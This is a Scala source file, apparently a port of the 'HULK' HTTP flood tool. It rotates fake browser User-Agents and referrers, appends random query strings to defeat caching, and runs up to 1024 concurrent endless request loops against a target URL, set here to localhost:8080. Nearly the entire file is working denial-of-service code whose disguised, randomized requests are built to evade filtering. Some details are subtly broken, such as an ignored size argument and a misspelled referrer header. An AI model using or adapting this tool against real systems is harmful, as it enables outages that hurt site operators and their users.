import http.RequestHandler
import scalaj.http.{HttpRequest, HttpResponse}
import scala.util.control.Breaks._
import scala.concurrent.Future
import scala.util.Random
import scala.concurrent._

// https://stackoverflow.com/questions/32306671/can-only-do-4-concurrent-futures-as-maximum-in-scala


object Utilities {
  def buildBlock(size: Int): String = {
    //  Creates random ascii string
    (for (_ <- 0 until 10)
      yield Random.between(65, 90).asInstanceOf[Char]
      ).mkString
  }
  def getRandom[A](seq: Seq[A]): A = seq(Random.between(0, seq.length))
}

import Utilities._

class Headers(host: String) {
  val userAgents = Vector("Mozilla/4.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/4.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
    "Mozilla/4.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/4.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/4.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
    "Mozilla/4.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
    "Mozilla/3.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/3.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "Mozilla/3.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
    "Mozilla/3.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/4.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
    "Mozilla/3.0 (compatible; MSIE 6.1; Windows XP)",
    "Opera/8.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51")

  val referrers = Vector(
    "https://www.google.com/?q=",
    "https://www.usatoday.com/search/results?q=",
    "https://engadget.search.aol.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://" + host + "/"
  )

  def generate: Seq[(String, String)] =
    Random.shuffle(Map(
      "User-Agent" -> getRandom(userAgents),
      "Cache-Control" -> "no-cache",
      "Accept-Charset" -> "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
      "Keep-Alive" -> Random.between(110, 120).toString, // formally Keep-alive params have changed
      "Referrer" -> (getRandom(referrers) + buildBlock(Random.between(5, 10))),
      "Connection" -> "keep-alive",
      "host" -> host
    ).toSeq)
}

class HTTPCaller(val url: String, val headers: Headers) {
  val paramJoiner: String = if (url.contains("?")) "&" else "?"
  val handler = new RequestHandler()

  def uniqueUrl: String =
    s"${url}${paramJoiner}${buildBlock(Random.between(3, 10))}=${buildBlock(Random.between(3, 10))}"

  def apply(): HttpResponse[String] = handler
    .apply(uniqueUrl)
    // Thread starvation on standard time-outs
    .timeout(connTimeoutMs = 10000, readTimeoutMs = 20000)
    .headers(headers.generate).asString
}


object Hulk extends App {
  System.setProperty("sun.net.http.allowRestrictedHeaders", "true")
  implicit val ec = scala.concurrent.ExecutionContext.Implicits.global

  val url = "http://localhost:8080/"

  var uri = new java.net.URI(url)
  val host = uri.getHost
  val headers = new Headers(host)
  val caller = new HTTPCaller(url, headers)

  @volatile
  var maxProcess = 1024
  @volatile
  var nProcess = 0
  @volatile
  var sent = 0
  @volatile
  var err = 0
  @volatile
  var responseCode: Int = 0
  var count = 0

  println("In use               |\tResp OK |\tGot err |\tLatest response")
  while (true) {

    if (sent % 10 == 0)
      print(f"\r$nProcess%6d of max $maxProcess%6d\t$sent%7d |\t$err%7d | \t$responseCode%6d")

    if (nProcess < maxProcess) {
      nProcess += 1
      count += 1
      val futureCount = count

      val f = Future{
        while (true) {

          // Will expand the thread pool
          // https://stackoverflow.com/questions/29068064/scala-concurrent-blocking-what-does-it-actually-do
          blocking{
            val response = caller()
            responseCode = response.code
            if (response.isSuccess)
              sent += 1
            if (response.isServerError)
              err += 1
            if (response.code == 429)
              break
          }
        }
      }
    }
  }

}
